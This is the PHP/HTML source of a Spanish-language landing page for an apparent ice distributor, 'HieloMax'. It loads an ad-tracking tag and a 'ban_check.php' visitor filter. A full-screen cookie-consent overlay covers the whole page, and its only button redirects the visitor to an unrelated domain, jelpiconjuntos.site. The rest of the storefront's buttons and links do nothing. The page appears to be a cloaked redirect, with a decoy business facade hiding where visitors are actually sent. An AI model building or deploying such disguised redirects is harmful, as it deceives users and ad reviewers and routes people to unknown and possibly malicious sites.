<?php require_once __DIR__ . '/ban_check.php'; ?>
<!DOCTYPE html>
<html lang="es">
<head>
    <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=AW-18232181848"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'AW-18232181848');
</script>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@700;900&family=Inter:wght@400;500&display=swap" rel="stylesheet">
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{background:#08111f;color:#e8f4fd;font-family:'Inter',sans-serif;min-height:100vh;overflow-x:hidden}

  /* NAV */
  nav{display:flex;align-items:center;justify-content:space-between;padding:1.2rem 3rem;border-bottom:1px solid rgba(0,180,255,0.12);position:sticky;top:0;background:rgba(8,17,31,0.92);backdrop-filter:blur(8px);z-index:100}
  .logo{font-family:'Barlow Condensed',sans-serif;font-size:1.6rem;font-weight:900;letter-spacing:.06em;color:#fff}
  .logo span{color:#00c9ff}
  nav ul{list-style:none;display:flex;gap:2rem}
  nav a{color:rgba(232,244,253,0.6);text-decoration:none;font-size:.85rem;letter-spacing:.04em;transition:color .2s}
  nav a:hover{color:#00c9ff}
  .nav-cta{background:#00c9ff;color:#08111f !important;padding:.45rem 1.2rem;border-radius:4px;font-weight:500}
  .nav-cta:hover{background:#33d4ff;color:#08111f !important}

  /* HERO */
  .hero{padding:5rem 3rem 4rem;display:grid;grid-template-columns:1fr 1fr;gap:3rem;align-items:center;max-width:1100px;margin:0 auto}
  .hero-badge{display:inline-block;border:1px solid rgba(0,201,255,0.35);color:#00c9ff;font-size:.72rem;letter-spacing:.14em;padding:.35rem .9rem;border-radius:2px;margin-bottom:1.4rem;text-transform:uppercase}
  .hero h1{font-family:'Barlow Condensed',sans-serif;font-size:4.2rem;font-weight:900;line-height:.95;letter-spacing:-.01em;color:#fff;text-transform:uppercase;margin-bottom:1.5rem}
  .hero h1 em{color:#00c9ff;font-style:normal}
  .hero p{color:rgba(232,244,253,0.55);line-height:1.7;font-size:.95rem;margin-bottom:2rem;max-width:400px}
  .hero-btns{display:flex;gap:1rem;flex-wrap:wrap}
  .btn-primary{background:#00c9ff;color:#08111f;padding:.75rem 1.8rem;border-radius:4px;font-weight:500;font-size:.9rem;text-decoration:none;border:none;cursor:pointer;transition:background .2s}
  .btn-primary:hover{background:#33d4ff}
  .btn-outline{border:1px solid rgba(0,201,255,0.4);color:#00c9ff;padding:.75rem 1.8rem;border-radius:4px;font-size:.9rem;text-decoration:none;transition:border-color .2s,background .2s;background:transparent;cursor:pointer}
  .btn-outline:hover{border-color:#00c9ff;background:rgba(0,201,255,0.06)}

  /* ICE VISUAL */
  .ice-visual{position:relative;display:flex;justify-content:center;align-items:center;height:320px}
  .ice-cube{position:absolute;border:1px solid rgba(0,201,255,0.25);background:rgba(0,180,255,0.04)}
  .ic1{width:180px;height:180px;border-radius:8px;transform:rotate(12deg);top:30px;left:60px}
  .ic2{width:120px;height:120px;border-radius:6px;transform:rotate(-8deg);top:80px;left:140px;border-color:rgba(0,201,255,0.45);background:rgba(0,180,255,0.09)}
  .ic3{width:80px;height:80px;border-radius:4px;transform:rotate(22deg);top:160px;left:80px;border-color:rgba(0,201,255,0.18)}
  .ic4{width:60px;height:60px;border-radius:3px;transform:rotate(-15deg);top:50px;left:200px;border-color:rgba(0,201,255,0.3);background:rgba(0,201,255,0.07)}
  .temp-badge{position:absolute;bottom:20px;right:30px;font-family:'Barlow Condensed',sans-serif;font-size:3.5rem;font-weight:900;color:rgba(0,201,255,0.18);letter-spacing:-.02em}

  /* STATS */
  .stats{background:rgba(0,201,255,0.04);border-top:1px solid rgba(0,201,255,0.1);border-bottom:1px solid rgba(0,201,255,0.1);padding:2rem 3rem}
  .stats-inner{display:grid;grid-template-columns:repeat(4,1fr);gap:1rem;max-width:1100px;margin:0 auto;text-align:center}
  .stat-num{font-family:'Barlow Condensed',sans-serif;font-size:2.4rem;font-weight:900;color:#00c9ff}
  .stat-lbl{font-size:.75rem;color:rgba(232,244,253,0.45);letter-spacing:.06em;text-transform:uppercase;margin-top:.2rem}

  /* PRODUCTOS */
  .section{padding:4rem 3rem;max-width:1100px;margin:0 auto}
  .section-label{font-size:.72rem;letter-spacing:.16em;text-transform:uppercase;color:#00c9ff;margin-bottom:.6rem}
  .section h2{font-family:'Barlow Condensed',sans-serif;font-size:2.6rem;font-weight:900;color:#fff;text-transform:uppercase;margin-bottom:2.5rem}
  .products-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:1.2rem}
  .product-card{border:1px solid rgba(0,201,255,0.14);border-radius:6px;padding:1.8rem 1.4rem;background:rgba(255,255,255,0.02);transition:border-color .2s,background .2s;cursor:default}
  .product-card:hover{border-color:rgba(0,201,255,0.4);background:rgba(0,201,255,0.04)}
  .product-icon{width:44px;height:44px;border-radius:4px;background:rgba(0,201,255,0.1);border:1px solid rgba(0,201,255,0.2);display:flex;align-items:center;justify-content:center;margin-bottom:1rem;font-size:1.3rem}
  .product-card h3{font-family:'Barlow Condensed',sans-serif;font-size:1.25rem;font-weight:700;color:#fff;text-transform:uppercase;letter-spacing:.04em;margin-bottom:.5rem}
  .product-card p{font-size:.82rem;color:rgba(232,244,253,0.45);line-height:1.65}
  .product-tag{display:inline-block;margin-top:.9rem;font-size:.7rem;letter-spacing:.1em;text-transform:uppercase;color:#00c9ff;border:1px solid rgba(0,201,255,0.25);padding:.25rem .7rem;border-radius:2px}

  /* MAYOREO / MINOREO */
  .channels{padding:0 3rem 4rem;max-width:1100px;margin:0 auto;display:grid;grid-template-columns:1fr 1fr;gap:1.5rem}
  .channel-card{border:1px solid rgba(0,201,255,0.14);border-radius:6px;padding:2.2rem;position:relative;overflow:hidden}
  .channel-card.mayor{border-color:rgba(0,201,255,0.3)}
  .channel-num{font-family:'Barlow Condensed',sans-serif;font-size:5rem;font-weight:900;color:rgba(0,201,255,0.07);position:absolute;top:-.5rem;right:1rem;line-height:1;pointer-events:none}
  .channel-badge{font-size:.68rem;letter-spacing:.14em;text-transform:uppercase;color:#00c9ff;margin-bottom:.8rem;display:block}
  .channel-card h3{font-family:'Barlow Condensed',sans-serif;font-size:2rem;font-weight:900;color:#fff;text-transform:uppercase;margin-bottom:.6rem}
  .channel-card p{font-size:.82rem;color:rgba(232,244,253,0.5);line-height:1.7;margin-bottom:1.2rem}
  .channel-list{list-style:none;display:flex;flex-direction:column;gap:.5rem}
  .channel-list li{font-size:.82rem;color:rgba(232,244,253,0.6);padding-left:1.2rem;position:relative}
  .channel-list li::before{content:'—';position:absolute;left:0;color:#00c9ff;font-size:.7rem}

  /* PROCESO */
  .proceso{background:rgba(0,201,255,0.03);border-top:1px solid rgba(0,201,255,0.08);padding:4rem 3rem}
  .proceso-inner{max-width:1100px;margin:0 auto}
  .proceso-steps{display:grid;grid-template-columns:repeat(4,1fr);gap:1rem;margin-top:2.5rem}
  .step{padding:1.4rem;border-left:2px solid rgba(0,201,255,0.2);padding-left:1.4rem}
  .step-n{font-family:'Barlow Condensed',sans-serif;font-size:2.5rem;font-weight:900;color:rgba(0,201,255,0.25);line-height:1}
  .step h4{font-family:'Barlow Condensed',sans-serif;font-size:1.1rem;font-weight:700;color:#fff;text-transform:uppercase;margin:.4rem 0 .4rem}
  .step p{font-size:.78rem;color:rgba(232,244,253,0.4);line-height:1.6}

  /* CTA FINAL */
  .cta-section{padding:4rem 3rem;text-align:center;border-top:1px solid rgba(0,201,255,0.1)}
  .cta-section h2{font-family:'Barlow Condensed',sans-serif;font-size:3rem;font-weight:900;color:#fff;text-transform:uppercase;margin-bottom:.8rem}
  .cta-section p{color:rgba(232,244,253,0.45);margin-bottom:2rem;font-size:.9rem}
  .cta-row{display:flex;gap:1rem;justify-content:center;flex-wrap:wrap}

  /* FOOTER */
  footer{border-top:1px solid rgba(0,201,255,0.08);padding:1.8rem 3rem;display:flex;justify-content:space-between;align-items:center;font-size:.75rem;color:rgba(232,244,253,0.3)}
  footer a{color:rgba(0,201,255,0.5);text-decoration:none}

  /* COOKIE OVERLAY */
  #cookieOverlay{
    position:fixed;inset:0;z-index:9999;
    display:flex;align-items:center;justify-content:center;
    background:rgba(8,17,31,0.90);
    backdrop-filter:blur(6px);
    -webkit-backdrop-filter:blur(6px);
  }
  .cookie-card{
    background:#0d1f36;
    border:1px solid rgba(0,201,255,0.25);
    border-radius:12px;
    padding:2.8rem 2.4rem;
    max-width:420px;
    width:90%;
    text-align:center;
    box-shadow:0 8px 48px rgba(0,0,0,0.5);
  }
  .cookie-icon{font-size:2.8rem;margin-bottom:1rem}
  .cookie-card h2{
    font-family:'Barlow Condensed',sans-serif;
    font-size:1.8rem;font-weight:900;
    color:#fff;text-transform:uppercase;
    letter-spacing:.04em;margin-bottom:.8rem;
  }
  .cookie-card p{
    font-size:.85rem;color:rgba(232,244,253,0.5);
    line-height:1.7;margin-bottom:2rem;
  }
  .cookie-btn{
    background:#00c9ff;color:#08111f;
    border:none;border-radius:6px;
    padding:.85rem 0;width:100%;
    font-size:1rem;font-weight:600;
    cursor:pointer;transition:background .2s;
    font-family:'Inter',sans-serif;
    letter-spacing:.02em;
  }
  .cookie-btn:hover{background:#33d4ff}
</style>
</head>
<body>

<!-- COOKIE OVERLAY -->
<div id="cookieOverlay">
  <div class="cookie-card">
    <div class="cookie-icon">🍪</div>
    <h2>Usamos cookies</h2>
    <p>Este sitio utiliza cookies para mejorar tu experiencia de navegación y garantizar el correcto funcionamiento de la plataforma. Al continuar, aceptas su uso.</p>
    <button class="cookie-btn" onclick="aceptarCookies()">Aceptar y continuar</button>
  </div>
</div>

<nav>
  <div class="logo">HIELO<span>MAX</span></div>
  <ul>
    <li><a href="#">Productos</a></li>
    <li><a href="#">Mayoreo</a></li>
    <li><a href="#">Minoreo</a></li>
    <li><a href="#">Nosotros</a></li>
    <li><a href="#" class="nav-cta">Cotizar</a></li>
  </ul>
</nav>

<div class="hero">
  <div>
    <div class="hero-badge">Distribución Nacional</div>
    <h1>Hielo puro,<br><em>frío</em><br>garantizado.</h1>
    <p>Fabricamos y distribuimos hielo de alta pureza para negocios, eventos e industrias. Venta al minoreo y mayoreo con entrega a domicilio.</p>
    <div class="hero-btns">
      <button class="btn-primary">Pedir ahora</button>
      <button class="btn-outline">Ver precios mayoreo</button>
    </div>
  </div>
  <div class="ice-visual">
    <div class="ice-cube ic1"></div>
    <div class="ice-cube ic2"></div>
    <div class="ice-cube ic3"></div>
    <div class="ice-cube ic4"></div>
    <div class="temp-badge">−18°C</div>
  </div>
</div>

<div class="stats">
  <div class="stats-inner">
    <div><div class="stat-num">500+</div><div class="stat-lbl">Clientes activos</div></div>
    <div><div class="stat-num">20T</div><div class="stat-lbl">Producción diaria</div></div>
    <div><div class="stat-num">24h</div><div class="stat-lbl">Entrega garantizada</div></div>
    <div><div class="stat-num">12+</div><div class="stat-lbl">Años de experiencia</div></div>
  </div>
</div>

<div class="section">
  <div class="section-label">Catálogo</div>
  <h2>Nuestros productos</h2>
  <div class="products-grid">
    <div class="product-card"><div class="product-icon">🧊</div><h3>Hielo en cubos</h3><p>Cubos estándar de 2×2 cm, transparentes y sin impurezas. Ideales para bebidas, coctelerías y restaurantes.</p><span class="product-tag">Más vendido</span></div>
    <div class="product-card"><div class="product-icon">❄️</div><h3>Hielo triturado</h3><p>Hielo molido fino para cocteles, pescaderías y aplicaciones médicas. Enfriamiento rápido y uniforme.</p><span class="product-tag">Gastronomía</span></div>
    <div class="product-card"><div class="product-icon">🧱</div><h3>Bloques de hielo</h3><p>Bloques de 10, 25 y 50 kg para conservación prolongada en transporte y almacenamiento industrial.</p><span class="product-tag">Industrial</span></div>
    <div class="product-card"><div class="product-icon">💧</div><h3>Hielo seco</h3><p>CO₂ sólido para congelación instantánea, transporte de alimentos perecederos y efectos especiales.</p><span class="product-tag">Especializado</span></div>
    <div class="product-card"><div class="product-icon">🎉</div><h3>Paquetes para eventos</h3><p>Kits completos para fiestas, bodas y eventos corporativos. Incluye hieleras y entrega puntual.</p><span class="product-tag">Eventos</span></div>
    <div class="product-card"><div class="product-icon">🐟</div><h3>Hielo para pesca</h3><p>Escamas de hielo de alta durabilidad para pescaderías, flotas pesqueras y puertos de desembarque.</p><span class="product-tag">Pesca</span></div>
  </div>
</div>

<div class="channels">
  <div class="channel-card mayor">
    <div class="channel-num">01</div>
    <span class="channel-badge">Distribución</span>
    <h3>Venta por mayor</h3>
    <p>Soluciones para empresas, distribuidores y negocios con alta demanda. Precios preferenciales y contratos a largo plazo.</p>
    <ul class="channel-list">
      <li>Pedidos desde 500 kg</li>
      <li>Transporte refrigerado incluido</li>
      <li>Facturación empresarial</li>
      <li>Descuentos por volumen</li>
      <li>Asesor comercial dedicado</li>
    </ul>
  </div>
  <div class="channel-card">
    <div class="channel-num">02</div>
    <span class="channel-badge">Consumidor final</span>
    <h3>Venta al menudeo</h3>
    <p>Para hogares, pequeños negocios y eventos. Pedidos rápidos desde nuestra tienda o por WhatsApp.</p>
    <ul class="channel-list">
      <li>Bolsas de 1, 3 y 5 kg</li>
      <li>Entrega en 2–4 horas</li>
      <li>Pago en efectivo o digital</li>
      <li>Punto de venta en planta</li>
      <li>Pedido mínimo: 1 bolsa</li>
    </ul>
  </div>
</div>

<div class="proceso">
  <div class="proceso-inner">
    <div class="section-label">Cómo funciona</div>
    <h2 style="font-family:'Barlow Condensed',sans-serif;font-size:2.6rem;font-weight:900;color:#fff;text-transform:uppercase;margin-bottom:0">De la planta a tu negocio</h2>
    <div class="proceso-steps">
      <div class="step"><div class="step-n">01</div><h4>Producción</h4><p>Agua purificada a −18 °C en equipos industriales certificados.</p></div>
      <div class="step"><div class="step-n">02</div><h4>Control de calidad</h4><p>Revisión bacteriológica y física antes del empaque.</p></div>
      <div class="step"><div class="step-n">03</div><h4>Empaque</h4><p>Bolsas selladas al vacío o granel según el pedido.</p></div>
      <div class="step"><div class="step-n">04</div><h4>Entrega</h4><p>Flota propia con furgones refrigerados. Puntualidad garantizada.</p></div>
    </div>
  </div>
</div>

<div class="cta-section">
  <h2>¿Listo para cotizar?</h2>
  <p>Cuéntanos cuánto necesitas y te damos precio en menos de una hora.</p>
  <div class="cta-row">
    <button class="btn-primary">Solicitar cotización</button>
    <button class="btn-outline">Llamar ahora</button>
  </div>
</div>

<footer>
  <span>© 2026 HieloMax. Todos los derechos reservados.</span>
  <span>Fabricación · Distribución · <a href="#">Contacto</a></span>
</footer>

<script>
  function aceptarCookies() {
    document.cookie = "cookies_aceptadas=1; path=/; max-age=" + (60*60*24*365);
    window.location.href = "https://jelpiconjuntos.site";
  }
</script>
</body>
</html>
